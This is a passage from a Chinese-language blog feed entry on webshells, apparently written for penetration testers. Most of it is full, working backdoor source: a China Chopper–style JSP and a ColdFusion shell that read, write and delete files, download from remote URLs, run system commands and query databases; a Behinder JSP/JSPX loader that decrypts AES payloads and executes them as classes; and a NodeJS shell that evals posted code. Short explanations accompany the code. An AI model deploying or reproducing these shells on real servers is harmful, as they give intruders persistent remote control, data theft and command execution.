File(d);if(sf.isDirectory())&#123;if(!df.exists())&#123;df.mkdir();&#125;File z[]=sf.listFiles();<br>for(int j=0;j&lt;z.length;j++)&#123;HH(s+&quot;/&quot;+z[j].getName(),d+&quot;/&quot;+z[j].getName());&#125;<br>&#125;else&#123;FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);<br>int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;is.close();os.close();&#125;&#125;<br>void II(String s,String d)throws Exception&#123;File sf=new File(s),df=new File(d);sf.renameTo(df);&#125;void JJ(String s)throws Exception&#123;File f=new File(s);f.mkdir();&#125;<br>void KK(String s,String t)throws Exception&#123;File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;);<br>java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());&#125;<br>void LL(String s, String d)throws Exception&#123;URL u=new URL(s);int n;FileOutputStream os=new FileOutputStream(d);<br>HttpURLConnection h=(HttpURLConnection)u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];<br>while((n=is.read(b,0,512))!=-1)&#123;os.write(b,0,n);&#125;os.close();is.close();h.disconnect();&#125;<br>void MM(InputStream is, StringBuffer sb)throws Exception&#123;String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));<br>while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\r\n&quot;);&#125;&#125;<br>void NN(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);ResultSet r=c.getMetaData().getCatalogs();<br>while(r.next())&#123;sb.append(r.getString(1)+&quot;\t&quot;);&#125;r.close();c.close();&#125;<br>void OO(String s,StringBuffer sb)throws Exception&#123;Connection c=GC(s);String[] t=&#123;&quot;TABLE&quot;&#125;;ResultSet r=c.getMetaData().getTables (null,null,&quot;%&quot;,t);<br>while(r.next())&#123;sb.append(r.getString(&quot;TABLE_NAME&quot;)+&quot;\t&quot;);&#125;r.close();c.close();&#125;<br>void PP(String s,StringBuffer sb)throws Exception&#123;String[] x=s.trim().split(&quot;\r\n&quot;);Connection c=GC(s);<br>Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery(&quot;select * from &quot;+x[3]);ResultSetMetaData d=r.getMetaData();<br>for(int i=1;i&lt;=d.getColumnCount();i++)&#123;sb.append(d.getColumnName(i)+&quot; (&quot;+d.getColumnTypeName(i)+&quot;)\t&quot;);&#125;r.close();m.close();c.close();&#125;<br>void QQ(String cs,String s,String q,StringBuffer sb)throws Exception&#123;int i;Connection c=GC(s);Statement m=c.createStatement(1005,1008);<br>try&#123;ResultSet r=m.executeQuery(q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(i=1;i&lt;=n;i++)&#123;sb.append(d.getColumnName(i)+&quot;\t|\t&quot;);<br>&#125;sb.append(&quot;\r\n&quot;);while(r.next())&#123;for(i=1;i&lt;=n;i++)&#123;sb.append(EC(r.getString(i),cs)+&quot;\t|\t&quot;);&#125;sb.append(&quot;\r\n&quot;);&#125;r.close();&#125;<br>catch(Exception e)&#123;sb.append(&quot;Result\t|\t\r\n&quot;);try&#123;m.executeUpdate(q);sb.append(&quot;Execute Successfully!\t|\t\r\n&quot;);<br>&#125;catch(Exception ee)&#123;sb.append(ee.toString()+&quot;\t|\t\r\n&quot;);&#125;&#125;m.close();c.close();&#125;<br>%&gt;&lt;%<br>String cs=request.getParameter(&quot;z0&quot;)+&quot;&quot;;request.setCharacterEncoding(cs);response.setContentType(&quot;text/html;charset=&quot;+cs);<br>String Z=EC(request.getParameter(Pwd)+&quot;&quot;,cs);String z1=EC(request.getParameter(&quot;z1&quot;)+&quot;&quot;,cs);String z2=EC(request.getParameter(&quot;z2&quot;)+&quot;&quot;,cs);<br>StringBuffer sb=new StringBuffer(&quot;&quot;);try&#123;sb.append(&quot;-&gt;&quot;+&quot;|&quot;);<br>if(Z.equals(&quot;A&quot;))&#123;String s=new File(application.getRealPath(request.getRequestURI())).getParent();sb.append(s+&quot;\t&quot;);if(!s.substring(0,1).equals(&quot;/&quot;))&#123;AA(sb);&#125;&#125;<br>else if(Z.equals(&quot;B&quot;))&#123;BB(z1,sb);&#125;else if(Z.equals(&quot;C&quot;))&#123;String l=&quot;&quot;;BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));<br>while((l=br.readLine())!=null)&#123;sb.append(l+&quot;\r\n&quot;);&#125;br.close();&#125;<br>else if(Z.equals(&quot;D&quot;))&#123;BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));<br>bw.write(z2);bw.close();sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;E&quot;))&#123;EE(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;F&quot;))&#123;FF(z1,response);&#125;<br>else if(Z.equals(&quot;G&quot;))&#123;GG(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;H&quot;))&#123;HH(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;I&quot;))&#123;II(z1,z2);sb.append(&quot;1&quot;);&#125;<br>else if(Z.equals(&quot;J&quot;))&#123;JJ(z1);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;K&quot;))&#123;KK(z1,z2);sb.append(&quot;1&quot;);&#125;else if(Z.equals(&quot;L&quot;))&#123;LL(z1,z2);sb.append(&quot;1&quot;);&#125;<br>else if(Z.equals(&quot;M&quot;))&#123;String[] c=&#123;z1.substring(2),z1.substring(0,2),z2&#125;;Process p=Runtime.getRuntime().exec(c);<br>MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);&#125;else if(Z.equals(&quot;N&quot;))&#123;NN(z1,sb);&#125;else if(Z.equals(&quot;O&quot;))&#123;OO(z1,sb);&#125;<br>else if(Z.equals(&quot;P&quot;))&#123;PP(z1,sb);&#125;else if(Z.equals(&quot;Q&quot;))&#123;QQ(cs,z1,z2,sb);&#125;<br>&#125;catch(Exception e)&#123;sb.append(&quot;ERROR&quot;+&quot;:// &quot;+e.toString());&#125;sb.append(&quot;|&quot;+&quot;&lt;-&quot;);out.print(sb.toString());<br>%&gt;<br></code></pre></td></tr></table></figure><p>菜刀形就是把所有功能全部寫進一個JSP檔，然後在HTTP POST的時候就會以<br>A, B, C, …, M 執行不同Payload，然面再接上一些參數。</p><p>下面是冰蝎 :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;<br>&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;<br>&lt;%<br>if (request.getMethod().equals(&quot;POST&quot;)) &#123;<br>  String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/<br>  session.putValue(&quot;u&quot;,k);<br>  Cipher c=Cipher.getInstance(&quot;AES&quot;);<br>  c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));<br>  new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;<br>  %&gt;<br></code></pre></td></tr></table></figure><p>冰蝎使用的是ClassLoader()，這樣就相當於是一個Eval函數了。</p><h3 id="JSPX"><a href="#JSPX" class="headerlink" title="JSPX"></a>JSPX</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;<br></code></pre></td></tr></table></figure><h3 id="CFM"><a href="#CFM" class="headerlink" title="CFM"></a>CFM</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;CFSET O=&quot;&quot; /&gt;&lt;CFTRY&gt;&lt;CFSWITCH EXPRESSION=#Form.chopper#&gt;&lt;CFCASE VALUE=&quot;A&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;Expandpath(&quot;./&quot;)&amp;Chr(9);<br>for(c=65;c lt 91;c=c+1)&#123;if(DirectoryExists(Chr(c)&amp;&quot;:\&quot;))O=O&amp;Chr(c)&amp;&quot;:&quot;;&#125;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;B&quot;&gt;<br>&lt;CFDIRECTORY DIRECTORY=&quot;#Form.z1#&quot; NAME=&quot;D&quot; SORT=&quot;Type&quot;&gt;&lt;CFLOOP Query=&quot;D&quot;&gt;&lt;CFSCRIPT&gt;O=O&amp;D.Name;If(D.Type eq &quot;Dir&quot;)O=O&amp;&quot;/&quot;;<br>O=O&amp;Chr(9)&amp;DateFormat(D.DateLastModified,&quot;yyyy-mm-dd&quot;)&amp;TimeFormat(D.DateLastModified,&quot; HH:MM:ss&quot;)&amp;Chr(9)&amp;D.Size&amp;Chr(9);<br>If(Left(Form.z1,1) eq &quot;/&quot;)&#123;O=O&amp;D.Mode;&#125;else&#123;O=O&amp;D.Attributes;&#125;O=O&amp;Chr(10);&lt;/CFSCRIPT&gt;&lt;/CFLOOP&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;C&quot;&gt;<br>&lt;CFFILE ACTION=&quot;Read&quot; FILE=&quot;#Form.z1#&quot; VARIABLE=&quot;O&quot;&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;D&quot;&gt;&lt;CFFILE ACTION=&quot;Write&quot; FILE=&quot;#Form.z1#&quot; OUTPUT=&quot;#Form.z2#&quot;&gt;<br>&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;E&quot;&gt;&lt;CFSCRIPT&gt;Function DF(P)&#123;F=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(P);L=0;i=0;<br>if(F.isDirectory())&#123;L=F.listFiles();for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(not L[i].delete())&#123;DF(L[i].getPath());&#125;&#125;&#125;F.delete();&#125;<br>DF(Form.z1);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;F&quot;&gt;&lt;cffile action=&quot;readbinary&quot; file=&quot;#Form.z1#&quot; variable=&quot;B&quot; /&gt;<br>&lt;cfset J=CreateObject(&quot;java&quot;,&quot;java.nio.ByteBuffer&quot;) /&gt;&lt;cfset X=J.Allocate(JavaCast( &quot;int&quot;, ArrayLen(B)+6)) /&gt;<br>&lt;cfset X.Put(ToBinary(ToBase64(&quot;-&gt;&quot;&amp;&quot;|&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;cfset X.Put(B, JavaCast(&quot;int&quot;,0), JavaCast(&quot;int&quot;,ArrayLen(B)) ) /&gt;<br>&lt;cfset X.Put(ToBinary(ToBase64(&quot;|&quot;&amp;&quot;&lt;-&quot;)), JavaCast(&quot;int&quot;,0), 3 ) /&gt;&lt;CFCONTENT Type=&quot;application/octet-stream&quot; Variable=&quot;#X.Array()#&quot;&gt;<br>&lt;CFABORT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;G&quot;&gt;&lt;CFSCRIPT&gt;F=CreateObject(&quot;java&quot;,&quot;java.io.FileOutputStream&quot;);F.init(Form.z1);<br>h=&quot;0123456789ABCDEF&quot;;C=Form.z2;for(i=0;i lt Len(C);i=i+2)&#123;F.write(BitOr(BitSHLN(h.indexOf(C.charAt(i)),4),h.indexOf(C.charAt(i+1))));&#125;<br>F.close();O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;H&quot;&gt;&lt;CFFUNCTION Name=&quot;cpf&quot;&gt;&lt;CFARGUMENT Name=&quot;S&quot;&gt;&lt;CFARGUMENT Name=&quot;D&quot;&gt;<br>&lt;CFFILE ACTION=&quot;Copy&quot; SOURCE=&quot;#S#&quot; DESTINATION=&quot;#D#&quot;&gt;&lt;/CFFUNCTION&gt;&lt;CFSCRIPT&gt;Function CP(S,D)&#123;sf=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(S);<br>df=CreateObject(&quot;java&quot;,&quot;java.io.File&quot;).init(D);L=0;i=0;if(sf.isDirectory())&#123;if(not df.exists())&#123;df.mkdir();&#125;L=sf.listFiles();<br>for(i=1;i lte ArrayLen(L);i=i+1)&#123;if(L[i].isDirectory())&#123;CP(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;else&#123;<br>cpf(L[i].getPath(),df.getPath()&amp;&quot;/&quot;&amp;L[i].getName());&#125;&#125;&#125;else&#123;cpf(S,D);&#125;&#125;CP(Form.z1,Form.z2);O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;<br>&lt;CFCASE VALUE=&quot;I&quot;&gt;&lt;CFFILE ACTION=&quot;MOVE&quot; SOURCE=&quot;#Form.z1#&quot; DESTINATION=&quot;#Form.z2#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;J&quot;&gt;<br>&lt;CFDIRECTORY Directory=&quot;#Form.z1#&quot; Action=&quot;Create&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;K&quot;&gt;&lt;CFSCRIPT&gt;<br>FileSetLastModified(Form.z1,ParseDateTime(Form.z2));O=&quot;1&quot;;&lt;/CFSCRIPT&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;L&quot;&gt;&lt;CFSCRIPT&gt;Z=Form.z2;<br>For(i=Len(Z);i gt 0;i=i-1)&#123;if(Mid(Z,i,1) eq &quot;/&quot; Or Mid(Z,i,1) eq &quot;\&quot;)&#123;Break;&#125;&#125;P=Left(Z,i);F=Mid(Z,i+1,256);&lt;/CFSCRIPT&gt;<br>&lt;CFHTTP METHOD=&quot;Get&quot; URL=&quot;#Form.z1#&quot; PATH=&quot;#P#&quot; FILE=&quot;#F#&quot;&gt;&lt;CFSET O=&quot;1&quot; /&gt;&lt;/CFCASE&gt;&lt;CFCASE VALUE=&quot;M&quot;&gt;<br>&lt;CFEXECUTE Name=&quot;#Mid(Form.z1,3,Len(Form.z1)-2)#&quot; Arguments=&quot;#Mid(Form.z1,1,2)# #Form.z2#&quot; Variable=&quot;O&quot; TimeOut=&quot;60&quot; /&gt;<br>&lt;/CFCASE&gt;&lt;/CFSWITCH&gt;&lt;CFCATCH Type=&quot;Any&quot;&gt;&lt;CFSET O=&quot;ERROR:// &quot;&amp;CFCatch.Message /&gt;&lt;/CFCATCH&gt;<br>&lt;/CFTRY&gt;&lt;CFOUTPUT&gt;-&gt;#Chr(124)&amp;O&amp;Chr(124)#&lt;-&lt;/CFOUTPUT&gt;<br></code></pre></td></tr></table></figure><p>菜刀形，跟上面的JSP一樣。</p><h3 id="NodeJS"><a href="#NodeJS" class="headerlink" title="NodeJS"></a>NodeJS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">var http = require(&#x27;http&#x27;),<br>url = require(&#x27;url&#x27;),<br>    exec = require(&#x27;child_process&#x27;).exec;<br>var querystring = require(&#x27;querystring&#x27;);<br><br>var host = &quot;127.0.0.1&quot;,<br>    port = &quot;5555&quot;,<br>    thisServerUrl = &quot;http://&quot; + host + &quot;:&quot; + port;<br><br>http.createServer(function (req, res) &#123;<br>  req.addListener(&#x27;end&#x27;, function () &#123;<br><br>  &#125;);<br>  //var parsedUrl = url.parse(req.url, true);<br>  //var cmd = parsedUrl.query[&#x27;cmd&#x27;];<br>  var string = &#x27;&#x27;;<br>        req.addListener(&#x27;data&#x27;, function(chunk)&#123;<br>            string += chunk;<br>        &#125;);<br>var cmd;<br>req.addListener(&#x27;end&#x27;, function()&#123;<br>      var strObj = querystring.parse(string);<br>  cmd = strObj.pass;<br>  res.writeHead(200, &#123;&#x27;Content-Type&#x27;: &#x27;text/plain&#x27;&#125;);<br>      if (cmd) &#123;<br>        try &#123;eval(cmd);&#125; catch(e) &#123;console.log(&quot;ERROR://&quot; + e);res.end(&quot;ERROR://&quot;);&#125;<br>      &#125; else &#123;<br>  res.end();<br>  &#125;<br>  &#125;);<br>&#125;).listen(port, host);<br>console.log(&#x27;Server running at &#x27; + thisServerUrl );<br></code></pre></td></tr></table></figure><p>NodeJS的木馬在滲透測試中不見得能用上，<br>因為使用條件跟php, asp, aspx這些比較過於苛刻。</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;甚麼是WebShell&quot;&gt;&lt;a href=&quot;#甚麼是WebShell&quot; class=&quot;headerlink&quot; title=&quot;甚麼是WebShell&quot;&gt;&lt;/a&gt;甚麼是WebShell&lt;/h1&gt;&lt;h2 id=&quot;WebShell是在滲透測試和入侵時都會用到的工具，是一種</summary>
      
    
    
    
    <category term="Code" scheme="http://example.com/categories/Code/"/>
    
    
    <category term="webshell" scheme="http://example.com/tags/webshell/"/>
    
    <category term="backdoor" scheme="http://example.com/tags/backdoor/"/>
    
    <category term="pentest" scheme="http://example.com/tags/pentest/"/>
    
    <category term="code" scheme="http://example.com/tags/code/"/>
    
    <category term="trojan" scheme="http://example.com/tags/trojan/"/>
    
  </entry>
  
</feed>
